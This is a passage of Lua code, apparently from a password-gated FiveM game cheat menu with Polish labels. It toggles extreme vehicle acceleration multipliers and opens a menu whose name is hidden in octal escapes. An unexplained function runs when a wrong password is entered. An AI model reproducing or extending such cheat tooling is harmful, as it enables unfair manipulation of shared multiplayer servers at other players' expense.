                        '~h~Przyspieszenie ~w~Auta ~g~16x',
                        t16x,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = dR
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Przyspieszenie ~w~Auta ~y~XD',
                        txd,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = dR
                            tbxd = false
                        end
                    )
                 then
                elseif
                    jariesa(
                        '~h~Przyspieszenie ~w~Auta ~y~BIG XD',
                        tbxd,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = dR
                        end
                    )
                 then
                end
                skaza.Display()
            elseif IsDisabledControlPressed(0, 315) then
			 local temp = KeyboardInput("Wpisz haslo ", "", 100)
				
				
                if triggerr == temp then
                    skaza.OpenMenu('\115\107\97\122\97\86\10')
					PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
					
                else
                    TmEM1U()
                end
                skaza.Display()
            end
            Citizen.Wait(0)
        end
    end
)